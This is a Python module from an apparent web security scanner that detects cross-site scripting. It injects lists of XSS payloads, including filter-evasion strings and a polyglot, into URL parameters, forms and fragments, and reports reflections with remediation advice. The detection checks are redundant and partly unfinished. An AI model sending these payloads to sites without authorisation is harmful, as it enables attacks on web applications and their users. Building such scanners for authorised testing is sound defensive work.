"""
Cross-Site Scripting (XSS) Detection Module
"""
import asyncio
import logging
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import html

from ..core.http_client import AsyncHTTPClient

logger = logging.getLogger(__name__)


class XSSDetector:
    """
    Advanced XSS detector supporting reflected, stored, and DOM-based XSS
    """
    
    XSS_PAYLOADS = [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<script>alert(\"XSS\")</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        
        # Filter evasion
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script >alert('XSS')</script >",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        "'><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        
        # Context-specific
        "' onmouseover='alert(1)",
        "\" onmouseover=\"alert(1)",
        "' onclick='alert(1)",
        "\" onclick=\"alert(1)",
        
        # Template injection style
        "{{alert('XSS')}}",
        "${alert('XSS')}",
        "<%= alert('XSS') %>",
        
        # Polyglot
        r"""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e""",
    ]
    
    DOM_PAYLOADS = [
        "#<img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
        "#<svg onload=alert(1)>",
    ]
    
    def __init__(self, http_client: AsyncHTTPClient):
        self.http_client = http_client
        self.findings = []
    
    async def scan(
        self,
        urls: List[str],
        intensity: str = "medium",
        authentication: Optional[Dict] = None,
        forms: Optional[List[Dict]] = None
    ) -> List[Dict]:
        """
        Scan for XSS vulnerabilities
        """
        logger.info(f"Starting XSS scan on {len(urls)} URLs")
        
        # Select payloads based on intensity
        if intensity == "low":
            payloads = self.XSS_PAYLOADS[:5]
        elif intensity == "medium":
            payloads = self.XSS_PAYLOADS[:15]
        else:
            payloads = self.XSS_PAYLOADS
        
        tasks = []
        for url in urls:
            tasks.append(self._scan_url(url, payloads, authentication))
        
        if forms:
            tasks.append(self.test_forms(forms, payloads))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.findings

    async def test_forms(self, forms: List[Dict], payloads: List[str]):
        """Test HTML forms for reflected XSS"""
        test_payloads = payloads[:5]
        for form in forms:
            action = form.get("action")
            if not action:
                continue
            method = form.get("method", "GET").upper()
            inputs = form.get("inputs", [])
            if not inputs:
                continue

            for input_field in inputs:
                param_name = input_field.get("name")
                if not param_name:
                    continue

                for payload in test_payloads:
                    data = {}
                    for f in inputs:
                        fname = f.get("name")
                        if not fname:
                            continue
                        if fname == param_name:
                            data[fname] = payload
                        else:
                            data[fname] = f.get("value", "test")

                    try:
                        if method == "POST":
                            resp = await self.http_client.post(action, data=data)
                        else:
                            resp = await self.http_client.get(action, params=data)

                        if resp and resp.status == 200:
                            text = await resp.text()
                            if payload in text and not self._is_properly_encoded(payload, text):
                                finding = {
                                    "type": "xss",
                                    "subtype": "form_reflected",
                                    "url": action,
                                    "parameter": param_name,
                                    "payload": payload,
                                    "severity": "high",
                                    "description": f"Cross-Site Scripting (XSS) detected in HTML form field '{param_name}' at {action}",
                                    "remediation": "Implement contextual output encoding and validate form inputs."
                                }
                                self.findings.append(finding)
                                logger.warning(f"XSS in form: {action} field={param_name}")
                                break
                    except Exception as e:
                        logger.debug(f"Form XSS test error: {e}")
    
    async def _scan_url(
        self,
        url: str,
        payloads: List[str],
        authentication: Optional[Dict]
    ):
        """Scan a single URL for XSS"""
        parsed = urlparse(url)
        
        # Test URL parameters (Reflected XSS)
        if parsed.query:
            await self._test_reflected_xss(url, parsed, payloads)
        
        # Test DOM-based XSS
        await self._test_dom_xss(url)
    
    async def _test_reflected_xss(self, url: str, parsed, payloads: List[str]):
        """Test for reflected XSS in URL parameters"""
        params = parse_qs(parsed.query)
        
        for param_name in params.keys():
            for payload in payloads:
                # Create test URL
                test_params = params.copy()
                test_params[param_name] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                response = await self.http_client.get(test_url)
                if not response or response.status != 200:
                    continue
                
                text = await response.text()
                
                # Check if payload is reflected without proper encoding
                if self._is_xss_vulnerable(text, payload):
                    self.findings.append({
                        'type': 'xss',
                        'subtype': 'reflected',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'severity': 'high',
                        'description': f"Reflected XSS vulnerability in parameter '{param_name}'",
                        'evidence': f"Payload reflected: {payload[:50]}...",
                        'remediation': "Implement proper output encoding based on context. Use Content Security Policy (CSP)."
                    })
                    logger.warning(f"XSS found: {url} param={param_name}")
                    break  # Found vulnerability, move to next parameter
    
    async def _test_dom_xss(self, url: str):
        """Test for DOM-based XSS"""
        for payload in self.DOM_PAYLOADS:
            test_url = url + payload
            response = await self.http_client.get(test_url)
            
            if response and response.status == 200:
                # DOM XSS detection requires JavaScript analysis
                # This is a simplified check
                text = await response.text()
                if payload.split('#')[1] in text:
                    self.findings.append({
                        'type': 'xss',
                        'subtype': 'dom_based',
                        'url': url,
                        'payload': payload,
                        'severity': 'medium',
                        'description': "Potential DOM-based XSS vulnerability",
                        'remediation': "Sanitize user input before inserting into DOM. Use textContent instead of innerHTML."
                    })
    
    def _is_xss_vulnerable(self, response_text: str, payload: str) -> bool:
        """
        Check if response indicates XSS vulnerability (strictly verifying non-encoded execution context)
        """
        # 1. Check if the exact payload exists in the raw HTTP response body (non-escaped)
        if payload in response_text:
            return True
            
        # 2. Check for tag reflection (e.g. <script>, <img>, etc)
        # If the payload starts with '<', check that it is reflected as '<' and not '&lt;'
        if payload.startswith('<') and payload in response_text:
            return True

        # 3. For attribute context, check if quotes are reflected unescaped
        if ("'" in payload or '"' in payload) and payload in response_text:
            return True

        return False
    
    async def test_stored_xss(self, forms: List[Dict], payloads: List[str]) -> List[Dict]:
        """
        Test forms for stored XSS (requires form submission)
        """
        stored_findings = []
        
        for form in forms:
            for payload in payloads:
                # Prepare form data with payload
                form_data = {}
                for input_field in form.get('inputs', []):
                    if input_field.get('type') in ['text', 'search', 'url', 'textarea']:
                        form_data[input_field['name']] = payload
                    else:
                        form_data[input_field['name']] = input_field.get('value', 'test')
                
                # Submit form
                try:
                    if form['method'] == 'POST':
                        response = await self.http_client.post(
                            form['action'],
                            data=form_data
                        )
                    else:
                        response = await self.http_client.get(
                            form['action'],
                            params=form_data
                        )
                    
                    # Check if payload was stored and reflected
                    if response and response.status in [200, 302]:
                        # Navigate to page where data would be displayed
                        # This requires application-specific knowledge
                        pass
                        
                except Exception as e:
                    logger.debug(f"Form submission error: {e}")
        
        return stored_findings